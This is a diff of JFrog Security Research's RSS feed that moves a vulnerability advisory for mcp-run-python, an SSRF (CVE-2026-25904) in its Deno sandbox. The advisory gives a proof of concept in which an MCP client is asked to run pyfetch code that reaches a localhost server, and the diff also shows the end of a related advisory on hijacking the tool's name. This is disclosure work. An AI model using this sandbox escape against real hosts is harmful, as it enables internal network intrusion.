@@ -4,7 +4,7 @@
         <title>JFrog Security Research</title>
         <link>https://research.jfrog.com</link>
         <description>Homepage feed: latest vulnerabilities and security research posts from JFrog Security Research.</description>
-        <lastBuildDate>Thu, 23 Jul 2026 00:42:04 GMT</lastBuildDate>
+        <lastBuildDate>Fri, 24 Jul 2026 00:38:52 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Home RSS</generator>
         <language>en</language>
@@ -1283,76 +1283,6 @@ https://github.com/pollen-robotics/reachy-mini-os/security/advisories/GHSA-7rhg-
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[mcp-run-python Deno SSRF]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</guid>
-            <pubDate>Mon, 09 Feb 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-25904, MEDIUM, Overly permissive Deno configuration in mcp-run-python leads to SSRF]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Overly permissive Deno configuration in mcp-run-python leads to SSRF
-
-## Component
-
-mcp-run-python
-
-## Affected versions
-
-(,)
-
-## Description
-
-The Pydantic-AI MCP Run Python tool configures the Deno sandbox with an overly permissive configuration that allows the underlying Python code to access the localhost interface of the host to perform SSRF attacks. Note - the "mcp-run-python" project is archived and unlikely to receive a fix.
-
-## PoC
-
-1. Configure Claude-Desktop or any other MCP Client to use the Pydantic-AI MCP Run Python tool:
-
-   ```json
-   {
-   "mcpServers": {
-   "mcp-run-python":{
-           "command": "uvx",
-           "args": [
-           "mcp-run-python",
-           "stdio"
-           ]
-       }
-     }
-   }
-   ```
-
-2. Start a HTTP server listening to the localhost interface:
-
-   ```bash
-   python3 -m http.server -b 127.0.0.1 1234
-   ```
-
-3. Ask the MCP client to run this PoC code:
-
-   ```python
-   from pyodide.http import pyfetch
-   response = await pyfetch("http://localhost:1234")
-   data = await response.text()
-   print(data)
-   ```
-
-4. View that the localhost server got a request from the tool
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-
-
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[mcp-run-python lack of isolation MCP takeover]]></title>
             <link>https://research.jfrog.com/vulnerabilities/mcp-run-python-lack-of-isolation-mcp-takeover-jfsa-2026-001653030/</link>
             <guid>https://research.jfrog.com/vulnerabilities/mcp-run-python-lack-of-isolation-mcp-takeover-jfsa-2026-001653030/</guid>
@@ -1439,6 +1369,76 @@ js.JSON.stringify = js_func
 9. The tool will seem stuck, Note the new notifications/tools/list\_changed notification from the server
 10. Click on `Clear` and then `List Tools`  
 11. Note that the tool name changed from `run_python_code` to `Hijacked Tool`
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+
+
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[mcp-run-python Deno SSRF]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</guid>
+            <pubDate>Mon, 09 Feb 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-25904, MEDIUM, Overly permissive Deno configuration in mcp-run-python leads to SSRF]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Overly permissive Deno configuration in mcp-run-python leads to SSRF
+
+## Component
+
+mcp-run-python
+
+## Affected versions
+
+(,)
+
+## Description
+
+The Pydantic-AI MCP Run Python tool configures the Deno sandbox with an overly permissive configuration that allows the underlying Python code to access the localhost interface of the host to perform SSRF attacks. Note - the "mcp-run-python" project is archived and unlikely to receive a fix.
+
+## PoC
+
+1. Configure Claude-Desktop or any other MCP Client to use the Pydantic-AI MCP Run Python tool:
+
+   ```json
+   {
+   "mcpServers": {
+   "mcp-run-python":{
+           "command": "uvx",
+           "args": [
+           "mcp-run-python",
+           "stdio"
+           ]
+       }
+     }
+   }
+   ```
+
+2. Start a HTTP server listening to the localhost interface:
+
+   ```bash
+   python3 -m http.server -b 127.0.0.1 1234
+   ```
+
+3. Ask the MCP client to run this PoC code:
+
+   ```python
+   from pyodide.http import pyfetch
+   response = await pyfetch("http://localhost:1234")
+   data = await response.text()
+   print(data)
+   ```
+
+4. View that the localhost server got a request from the tool
 
 
 
